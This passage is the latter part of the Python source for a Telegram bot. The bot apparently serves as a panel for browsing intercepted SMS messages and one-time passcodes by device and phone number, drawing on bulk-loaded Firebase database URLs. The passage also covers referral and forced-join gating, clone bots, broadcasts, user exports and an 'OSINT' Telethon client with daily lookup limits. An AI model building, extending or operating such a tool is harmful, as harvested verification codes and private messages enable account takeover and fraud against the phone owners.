        elif data == "md:clear_rot":
            ROTATION_MEDIA.clear(); await db.set_setting("rotation_media", ROTATION_MEDIA)
            await view_admin_media(update, ctx)

        elif data == "txt:view":
            await view_admin_texts(update, ctx)
        elif data.startswith("txt:set:"):
            which = data.split(":", 2)[2]
            labels = {"welcome": "welcome", "help": "help", "support": "support", "maint": "maintenance"}
            pending_action[uid] = {"action": f"txt_set_{which}"}
            await reply(update, ctx, premium_text(f"edit — {labels.get(which, which)}", [
                "📝 <b>send the new text:</b>", "",
                "<i>HTML supported: bold, italic, code, spoiler.</i>",
                "<i>send a single <code>-</code> to reset to default.</i>",
                "<i>send /cancel to abort.</i>",
            ], icon="book"))
        elif data == "txt:reset":
            globals()["WELCOME_TEXT"] = ""
            globals()["HELP_TEXT"] = ""
            globals()["SUPPORT_TEXT"] = ""
            globals()["MAINTENANCE_TEXT"] = ""
            await db.set_setting("welcome_text", "")
            await db.set_setting("help_text", "")
            await db.set_setting("support_text", "")
            await db.set_setting("maintenance_text", "")
            await view_admin_texts(update, ctx)

        elif data == "cl:add":
            pending_action[uid] = {"action": "cl_add"}
            await reply(update, ctx, premium_text("add clone", ["🤖 <b>send bot token:</b>\n<code>123:AAA...</code>"], icon="rocket"))
        elif data == "cl:list":
            await view_admin_clones(update, ctx)
        elif data == "cl:remove":
            if not CLONES:
                await cq.answer("❌ none", show_alert=True); return
            rows = [[ibtn(f"🗑 @{c.get('username','?')}", cb=f"cl:del:{c['token'][:20]}", style="danger", eid=PREMIUM_EMOJIS.get("delete"))] for c in CLONES]
            rows.append([ibtn(sc("Back"), cb="admin:clones", eid=PREMIUM_EMOJIS.get("cross"))])
            await reply(update, ctx, premium_text("remove clone", ["<i>tap to stop + delete</i>"], icon="rocket"), InlineKeyboardMarkup(rows))
        elif data.startswith("cl:del:"):
            prefix = data.split(":", 2)[2]
            tgt = next((c for c in CLONES if c["token"].startswith(prefix)), None)
            if tgt:
                await stop_clone(tgt["token"])
                CLONES.remove(tgt); await db.set_setting("clones", CLONES)
            await view_admin_clones(update, ctx)

        elif data.startswith("bc:start:"):
            style = data.split(":", 2)[2]
            pending_action[uid] = {"action": "bc_send", "style": style}
            await reply(update, ctx, premium_text(f"broadcast — {style}", [
                "📢 <b>send the message to broadcast:</b>",
                "", "<i>any media/format will be handled per style.</i>",
            ], icon="rocket"))

        elif data == "fj:toggle":
            globals()["FORCE_JOIN_ENABLED"] = not FORCE_JOIN_ENABLED
            await db.set_setting("force_join_enabled", FORCE_JOIN_ENABLED)
            await view_admin_fj(update, ctx)
        elif data == "fj:add_public":
            pending_action[uid] = {"action": "fj_add_public"}
            await reply(update, ctx, premium_text("add public channel", [
                "📢 <b>send public channel:</b>\n"
                "<code>@mychannel</code> or <code>https://t.me/...</code>"
            ], icon="lock"))
        elif data == "fj:add_private":
            pending_action[uid] = {"action": "fj_add_private"}
            await reply(update, ctx, premium_text("add private channel", [
                "🔒 <b>send private group chat_id:</b>\n"
                "<code>-1001234567890</code>\n\n"
                "<i>⚠️ add bot as admin with 'invite users' permission first.</i>"
            ], icon="lock"))
        elif data == "fj:list":
            lines = []
            for ch in FORCE_JOIN_CHANNELS:
                icon = "🔒" if ch.get("type") == "private" else "📢"
                lines.append(f"{icon} <code>{esc(str(ch.get('channel','?')))}</code>")
            await reply(update, ctx, premium_text(f"channels ({len(FORCE_JOIN_CHANNELS)})", lines or ["<i>none</i>"], icon="lock"), kb_admin_fj())
        elif data == "fj:remove":
            if not FORCE_JOIN_CHANNELS:
                await cq.answer("❌ none", show_alert=True); return
            rows = []
            for i, ch in enumerate(FORCE_JOIN_CHANNELS):
                icon = "🔒" if ch.get("type") == "private" else "📢"
                lbl = str(ch.get("title") or ch.get("channel") or "?")[:20]
                rows.append([ibtn(f"🗑 {icon} {lbl}", cb=f"fj:del:{i}", style="danger", eid=PREMIUM_EMOJIS.get("delete"))])
            rows.append([ibtn(sc("Back"), cb="admin:fj", eid=PREMIUM_EMOJIS.get("cross"))])
            await reply(update, ctx, premium_text("remove channel", ["<i>tap to remove</i>"], icon="lock"), InlineKeyboardMarkup(rows))
        elif data.startswith("fj:del:"):
            try:
                i = int(data.split(":", 2)[2])
                if 0 <= i < len(FORCE_JOIN_CHANNELS):
                    FORCE_JOIN_CHANNELS.pop(i); await db.set_setting("force_join", FORCE_JOIN_CHANNELS)
            except: pass
            await view_admin_fj(update, ctx)

        elif data == "ref:toggle":
            globals()["REFERRAL_ENABLED"] = not REFERRAL_ENABLED
            await db.set_setting("referral_enabled", REFERRAL_ENABLED)
            await view_admin_ref(update, ctx)
        elif data == "ref:set_required":
            pending_action[uid] = {"action": "ref_set_required"}
            await reply(update, ctx, premium_text("set required", [f"🎯 <b>required referrals (current: {REQUIRED_REFERRALS}):</b>"], icon="check"))
        elif data == "ref:view_progress":
            lines = []
            for u, ud in sorted(all_users.items(), key=lambda x: -referral_count(x[0]))[:20]:
                c = referral_count(u)
                if c == 0: continue
                nm = (ud.get("name") or "?")[:15]
                mark = "✅" if c >= REQUIRED_REFERRALS else "🟡"
                lines.append(f"{mark} <code>{u}</code> — {esc(nm)} · <b>{c}</b>")
            if not lines: lines = ["<i>no referrals yet</i>"]
            await reply(update, ctx, premium_text("referral progress", lines, icon="chart"), kb_admin_ref())

        elif data == "tool:export:json":
            blob = json.dumps({"users": all_users, "databases": DATABASES}, indent=2).encode()
            await ctx.bot.send_document(uid, document=blob, filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", caption=premium_text("json export", ["📤 <b>exported</b>"], icon="upload"), parse_mode="HTML")
        elif data == "tool:export:sqlite":
            try:
                fd, path = tempfile.mkstemp(suffix=".sqlite"); os.close(fd)
                try:
                    con = sqlite3.connect(path); cur = con.cursor()
                    cur.execute("CREATE TABLE users (uid TEXT PRIMARY KEY, name TEXT, username TEXT, banned INT, joined_at TEXT)")
                    for u, ud in all_users.items():
                        cur.execute("INSERT OR REPLACE INTO users VALUES (?,?,?,?,?)", (str(u), ud.get("name",""), ud.get("username",""), 1 if ud.get("banned") else 0, ud.get("joined_at","")))
                    cur.execute("CREATE TABLE firebases (tag TEXT PRIMARY KEY, url TEXT)")
                    for t, url in DATABASES.items():
                        cur.execute("INSERT OR REPLACE INTO firebases VALUES (?,?)", (t, url))
                    con.commit(); con.close()
                    with open(path, "rb") as f:
                        await ctx.bot.send_document(uid, document=f.read(), filename=f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sqlite", caption=premium_text("sqlite export", ["📤 <b>exported</b>"], icon="upload"), parse_mode="HTML")
                finally:
                    try: os.unlink(path)
                    except: pass
            except Exception as e:
                await cq.answer(f"❌ {e}", show_alert=True)
        elif data == "tool:import":
            pending_action[uid] = {"action": "import_file"}
            await reply(update, ctx, premium_text("import database", ["📥 <b>upload .json or .sqlite file:</b>\n\n<i>existing data will be merged.</i>"], icon="upload"))
        elif data == "tool:maint":
            globals()["MAINTENANCE_MODE"] = not MAINTENANCE_MODE
            await db.set_setting("maintenance", MAINTENANCE_MODE)
            await view_admin_tools(update, ctx)
        elif data == "tool:info":
            s = FB.stats
            up = int(time.time() - START_TIME)
            await reply(update, ctx, premium_text("system info", [
                f"⏱ uptime: <b>{up//3600}h {(up%3600)//60}m</b>",
                f"📡 dbs: <b>{len(DATABASES)}</b>",
                f"👥 users: <b>{len(all_users)}</b>",
                f"🧠 seen ids: <b>{len(SEEN_IDS)}</b>",
                f"🤖 clones: <b>{len(CLONE_APPS)}</b>",
                "", f"🌐 fb req: <b>{s['requests']}</b>",
                f"🎯 cache hit: <b>{s['hit_pct']}%</b>",
            ], icon="chart"), kb_admin_tools())

        elif data.startswith("nav:devices"):
            page = int(data.split(":")[-1]) if data.count(":") >= 2 else 0
            await view_devices(update, ctx, page)
        elif data.startswith("nav:panels"):
            page = int(data.split(":")[-1]) if data.count(":") >= 2 else 0
            await view_panels(update, ctx, page)
        elif data.startswith("panel:"):
            _, tag, page = data.split(":", 2); page = int(page)
            await view_panel_devices(update, ctx, tag, page)
        elif data.startswith("num:otps:"):
            num = data.split(":", 2)[2]
            await view_number_otps(update, ctx, num)
        elif data.startswith("num:sms:"):
            num = data.split(":", 2)[2]
            await view_number_sms(update, ctx, num)
        elif data.startswith("dev:"):
            parts = data.split(":")
            dev_id = parts[1]
            if len(parts) == 2:
                await view_device(update, ctx, dev_id)
            elif parts[2] == "w":
                if user_focus.get(uid) == dev_id:
                    user_focus.pop(uid, None)
                else:
                    user_focus[uid] = dev_id
                await db.set_setting("focus", user_focus)
                await view_device(update, ctx, dev_id)
                return
            elif parts[2] == "otps":
                await view_device_otps(update, ctx, dev_id)
            elif parts[2] == "sms":
                await view_device_sms(update, ctx, dev_id)
        else:
            await cq.answer()
    except Exception as e:
        log.exception(f"cb {data}: {e}")
        try: await cq.answer("⚠️ error", show_alert=False)
        except: pass
        return
    try: await cq.answer()
    except: pass

# ══════════════════════════════════════════════════════════════════
# DOCUMENT
# ══════════════════════════════════════════════════════════════════
async def on_document(update, ctx):
    uid = update.effective_chat.id
    if not is_admin(uid): return
    doc = update.message.document if update.message else None
    if not doc: return
    pending = pending_action.pop(uid, None) or {}
    action = pending.get("action")
    if action == "add_dbs":
        if not doc.file_name.lower().endswith((".txt", ".csv", ".json")):
            await reply(update, ctx, premium_text("error", ["❌ <b>send .txt/.csv/.json</b>"], icon="cross")); return
        f = await ctx.bot.get_file(doc.file_id)
        buf = io.BytesIO(); await f.download_to_memory(buf)
        await process_db_add(update, ctx, buf.getvalue().decode("utf-8", errors="ignore"), pending.get("mode", "all")); return
    if action == "import_file":
        f = await ctx.bot.get_file(doc.file_id)
        buf = io.BytesIO(); await f.download_to_memory(buf)
        blob = buf.getvalue()
        try:
            if doc.file_name.lower().endswith(".sqlite"):
                imported = _import_sqlite(blob)
            else:
                imported = _import_json(blob)
        except Exception as e:
            await reply(update, ctx, premium_text("error", [f"❌ <code>{esc(e)}</code>"], icon="cross")); return
        cu = cf = 0
        for k, v in imported["users"].items():
            try:
                all_users[int(k)] = {**v, "banned": bool(v.get("banned")), "referrals": v.get("referrals", [])}
                await db.save_user(int(k), all_users[int(k)])
                cu += 1
            except: pass
        for tag, url in imported["firebases"].items():
            if tag not in DATABASES:
                DATABASES[tag] = url
                await db.add_db(tag, url)
                cf += 1
        await reply(update, ctx, premium_text("import complete", [f"👥 users: <b>{cu}</b>", f"📡 firebases: <b>{cf}</b>"], icon="check"), kb_admin_tools()); return
    await reply(update, ctx, premium_text("error", ["❓ <b>no active import task.</b>"], icon="cross"))

def _import_sqlite(blob):
    fd, path = tempfile.mkstemp(suffix=".sqlite"); os.close(fd)
    try:
        with open(path, "wb") as f: f.write(blob)
        con = sqlite3.connect(path); cur = con.cursor()
        out = {"users": {}, "firebases": {}}
        try:
            cur.execute("SELECT * FROM users")
            for row in cur.fetchall():
                out["users"][str(row[0])] = {"name": row[1] or "", "username": row[2] or "", "banned": bool(row[3]), "joined_at": row[4] or ""}
        except: pass
        try:
            cur.execute("SELECT * FROM firebases")
            for row in cur.fetchall(): out["firebases"][row[0]] = row[1]
        except: pass
        con.close(); return out
    finally:
        try: os.unlink(path)
        except: pass

def _import_json(blob):
    raw = json.loads(blob.decode("utf-8", errors="ignore"))
    out = {"users": {}, "firebases": {}}
    for k, v in (raw.get("users") or raw.get("all_users") or {}).items():
        if isinstance(v, dict): out["users"][str(k)] = v
    fbs = raw.get("databases") or raw.get("DATABASES") or raw.get("firebases") or {}
    if isinstance(fbs, dict): out["firebases"] = dict(fbs)
    return out

# ══════════════════════════════════════════════════════════════════
# CLONE MANAGER
# ══════════════════════════════════════════════════════════════════
async def start_clone(token):
    if token in CLONE_APPS: return True, CLONE_APPS[token]["username"]
    try:
        probe = Bot(token); me = await probe.get_me(); await probe.close()
    except Exception as e:
        log.warning(f"clone probe: {e}"); return False, ""
    try:
        app = Application.builder().token(token).concurrent_updates(True).build()
        app.add_handler(CommandHandler("start", cmd_start))
        app.add_handler(CommandHandler("cancel", cmd_cancel))
        app.add_handler(CallbackQueryHandler(on_callback))
        app.add_handler(ChatJoinRequestHandler(on_join_request))
        app.add_handler(MessageHandler(filters.Document.ALL, on_document))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
        await app.initialize(); await app.start()
        await app.updater.start_polling(drop_pending_updates=True, allowed_updates=["message","callback_query","chat_join_request"])
        CLONE_APPS[token] = {"app": app, "username": me.username}
        return True, me.username
    except Exception as e:
        log.error(f"clone start: {e}"); return False, ""

async def stop_clone(token):
    entry = CLONE_APPS.pop(token, None)
    if not entry: return
    try:
        await entry["app"].updater.stop()
        await entry["app"].stop()
        await entry["app"].shutdown()
    except: pass

# ══════════════════════════════════════════════════════════════════
# /cancel
# ══════════════════════════════════════════════════════════════════
async def cmd_cancel(update, ctx):
    pending_action.pop(update.effective_chat.id, None)
    await reply(update, ctx, premium_text("cancelled", ["✅"], icon="cross"), kb_main(is_admin(update.effective_chat.id)))

# ══════════════════════════════════════════════════════════════════
# LIFECYCLE
# ══════════════════════════════════════════════════════════════════
async def post_init(app):
    await db.init()
    
    # Load global state from DB
    globals()["DATABASES"] = await db.get_all_dbs()
    globals()["ADMIN_IDS"] = set(await db.get_setting("admins", [OWNER_HARD_ID]))
    globals()["allowed_users"] = set(await db.get_setting("allowed", []))
    globals()["PREMIUM_EMOJIS"] = {**PREMIUM_EMOJIS, **(await db.get_setting("emojis", {}))}
    globals()["WELCOME_MEDIA"] = await db.get_setting("welcome_media", WELCOME_MEDIA)
    globals()["WELCOME_TEXT"] = await db.get_setting("welcome_text", "")
    globals()["HELP_TEXT"] = await db.get_setting("help_text", "")
    globals()["SUPPORT_TEXT"] = await db.get_setting("support_text", "")
    globals()["MAINTENANCE_TEXT"] = await db.get_setting("maintenance_text", "")
    globals()["LIVE_MONITOR_CHAT"] = await db.get_setting("live_chat", 0)
    globals()["LIVE_MONITOR"] = await db.get_setting("live_monitor", False)
    globals()["AUTO_BACKUP_CHAT"] = await db.get_setting("backup_chat", 0)
    globals()["AUTO_BACKUP_INTERVAL"] = await db.get_setting("backup_interval", 0)
    globals()["AUTO_BACKUP_ENABLED"] = await db.get_setting("backup_enabled", False)
    globals()["MAINTENANCE_MODE"] = await db.get_setting("maintenance", False)
    globals()["FORCE_JOIN_ENABLED"] = await db.get_setting("force_join_enabled", False)
    globals()["FORCE_JOIN_CHANNELS"] = await db.get_setting("force_join", [])
    globals()["REQUIRED_REFERRALS"] = await db.get_setting("required_refs", 2)
    globals()["GRANT_ACCESS_REQUIRED"] = await db.get_setting("grant_required", True)
    globals()["REFERRAL_ENABLED"] = await db.get_setting("referral_enabled", True)
    globals()["user_focus"] = await db.get_setting("focus", {})
    globals()["all_users"] = await db.get_all_users()
    
    # Load Telethon settings
    globals()["TG_API_ID"] = await db.get_setting("tg_api_id", 0)
    globals()["TG_API_HASH"] = await db.get_setting("tg_api_hash", "")
    globals()["DAILY_TG_LIMIT"] = await db.get_setting("daily_tg_limit", 10)
    globals()["DAILY_WA_LIMIT"] = await db.get_setting("daily_wa_limit", 10)
    globals()["DAILY_FB_LIMIT"] = await db.get_setting("daily_fb_limit", 5)
    await init_telethon()

    asyncio.create_task(poll_loop(app))
    asyncio.create_task(backup_loop(app))
    for c in CLONES:
        ok, uname = await start_clone(c["token"])
        if ok: c["username"] = uname
    log.info(f"workers started · OSINT online · clones: {len(CLONE_APPS)}")

async def post_shutdown(app):
    for tok in list(CLONE_APPS.keys()): await stop_clone(tok)
    if tg_client: await tg_client.disconnect()
    await db.close()
    await FB.close()
    log.info("shutdown")

def main():
    if not TOKEN:
        print("❌ BOT_TOKEN missing"); return
    app = (Application.builder().token(TOKEN).post_init(post_init)
            .post_shutdown(post_shutdown).concurrent_updates(True).build())
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("broadcastbtn", cmd_broadcastbtn))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(ChatJoinRequestHandler(on_join_request))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    log.info(f"starting v19.0 @{BOT_USERNAME.lstrip('@')}")
    app.run_polling(drop_pending_updates=True,
                     allowed_updates=["message","callback_query","chat_join_request"])

if __name__ == "__main__":
    main()
